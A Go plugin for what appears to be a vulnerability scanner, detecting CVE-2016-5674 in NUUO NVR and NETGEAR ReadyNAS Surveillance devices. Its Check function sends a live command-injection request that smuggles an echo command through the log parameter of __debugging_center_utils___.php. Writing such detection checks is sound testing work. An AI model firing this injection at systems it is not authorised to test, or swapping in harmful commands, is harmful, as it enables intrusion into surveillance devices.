package goplugin

import (
	"Yscanner/utils"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("nuuo_debugging_center_utils_rce", &nuuo_debugging_center_utils_rce{})
}

type nuuo_debugging_center_utils_rce struct{}

func (p *nuuo_debugging_center_utils_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "NUUO debugging_center_utils rce漏洞",
		VulnInfo: "NUUO NVR（Network Video Recorder）是一种专门设计用于视频监控和录像的硬件设备或软件平台。NUUO NVR视频存储管理设备__debugging_center_utils___.php存在未授权远程命令执行漏洞，攻击者可在没有任何权限的情况下通过log参数执行任意PHP代码，从而入侵服务器，获取服务器的管理员权限。",
		VulnID:   "CVE-2016-5674",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "1.7.5 <= NUUO NVRmini 2/NUUO NVRsolo <= 3.0.0; 1.1.1 <= NETGEAR ReadyNAS Surveillance <= 1.4.1 ",
		CWE:      "CWE-20	输入验证不恰当",
	}
}

func (p *nuuo_debugging_center_utils_rce) Check(netloc string) bool {
	randint1 := utils.GenRandomInt(5)
	randint2 := utils.GenRandomInt(5)
	payload := fmt.Sprintf("echo%%20%%24%%5B%d%%20%%2B%%20%d%%5D", randint1, randint2)
	req, err := http.NewRequest("GET", netloc+"/__debugging_center_utils___.php?log=;"+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, strconv.Itoa(randint1+randint2)) {
		return true
	}
	return false
}
